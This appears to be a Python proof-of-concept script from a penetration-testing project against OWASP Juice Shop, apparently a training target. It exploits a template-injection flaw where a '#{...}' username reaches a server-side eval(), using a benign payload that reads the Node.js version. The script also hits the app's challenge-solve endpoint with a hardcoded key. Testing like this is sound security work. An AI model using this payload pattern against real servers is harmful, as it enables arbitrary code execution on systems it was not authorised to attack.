#!/usr/bin/env python3
"""pt41: a username containing #{...} is passed straight to a raw
eval() on the server, the same unsandboxed scope as the rest of the
application, when rendering the profile page. Not a crafted edge
case, genuine arbitrary server-side JavaScript execution.

Found white-box via routes/userProfile.ts, then re-checked after
pt40 proved a challenge's own disabledEnv flag doesn't always govern
the code path it looks like it should. usernameXssChallenge DOES
check its own flag here (unlike pt40's case), but that flag's
underlying logic (lib/insecurity.ts's getChallengeEnablementStatus)
short-circuits to fully enabled whenever challenges.safetyMode is set
to 'disabled', exactly what Juice Shop's own unsafe.yml config does,
the same config pt10 and pt40 already use. Verified live, not
assumed: the default container never executes the eval() branch; the
unsafe container does.

This PoC deliberately only ever reads harmless, non-sensitive
runtime information (the Node.js version string) to prove code
execution capability, never anything destructive, never a file
write, process spawn, or sensitive-data read.

Like pt10 and pt40, the independent variable is which vendor-shipped
config is running, not a proxy toggle. --mode safe checks the
default Docker deployment (port 3001). --mode unsafe checks the same
NODE_ENV=unsafe container pt10/pt40 already established (port 3012).

Standard library only (urllib, json, re).
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt41-001.json"
EVAL_PAYLOAD = "#{global.process.version}"
NODE_VERSION_PATTERN = re.compile(r">v\d+\.\d+\.\d+<")


class _NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response

    https_response = http_response


_OPENER = urllib.request.build_opener(_NoRedirect)


def _request(method: str, url: str, token_cookie: str | None = None, form: dict | None = None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if form is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if token_cookie:
        req.add_header("Cookie", f"token={token_cookie}")
    try:
        with _OPENER.open(req, timeout=10) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def _json_request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, json.loads(resp.read())


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))
    email = f"pt41-{stamp}@flatline.test"
    password = "Pt41Pass123!"

    _json_request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _json_request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login failed: HTTP {status}")
    token = body["authentication"]["token"]

    post_status, _ = _request("POST", f"{target}/profile", token_cookie=token, form={"username": EVAL_PAYLOAD})
    get_status, page = _request("GET", f"{target}/profile", token_cookie=token)

    node_version_leaked = bool(NODE_VERSION_PATTERN.search(page))
    payload_reflected_raw = f'value="{EVAL_PAYLOAD}"' in page

    if get_status == 200 and node_version_leaked:
        status_result = "VULNERABLE"
        match = NODE_VERSION_PATTERN.search(page)
        summary = f"The real Node.js version ({match.group(0).strip('><')}) was eval'd and rendered on the profile page, confirming arbitrary server-side code execution."
        # Juice Shop's own scoring confirmation for this exact bug class
        # (see README.md's "Checked the scoreboard" section): hitting this
        # with the app's own hardcoded key, found via the same white-box
        # source read as the exploit itself, is what flips sstiChallenge and
        # fires the real "challenge solved" notification.
        _request("GET", f"{target}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3", token_cookie=None)
    elif get_status == 200 and not node_version_leaked and payload_reflected_raw:
        status_result = "REMEDIATED"
        summary = "The username was stored and displayed literally; no eval'd Node.js version string appeared anywhere in the response."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: post_status={post_status}, get_status={get_status}, node_version_leaked={node_version_leaked}, payload_reflected_raw={payload_reflected_raw}."

    legit_email = f"pt41-legit-{stamp}@flatline.test"
    _json_request("POST", f"{target}/api/Users", body={"email": legit_email, "password": password, "passwordRepeat": password})
    legit_status, legit_body = _json_request("POST", f"{target}/rest/user/login", body={"email": legit_email, "password": password})
    legit_token = legit_body["authentication"]["token"]
    _request("POST", f"{target}/profile", token_cookie=legit_token, form={"username": "FlatlineLegitUser"})
    _, legit_page = _request("GET", f"{target}/profile", token_cookie=legit_token)
    legitimate_normal_username_displays_ok = "FlatlineLegitUser" in legit_page

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "node_version_leaked": node_version_leaked,
        "summary": summary,
        "legitimate_normal_username_displays_ok": legitimate_normal_username_displays_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--mode", choices=["safe", "unsafe"], default="safe")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = blueprint["safe_target"]["host"] if args.mode == "safe" else blueprint["unsafe_target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{args.mode}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt41-ssti-eval-rce", "mode": args.mode, **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
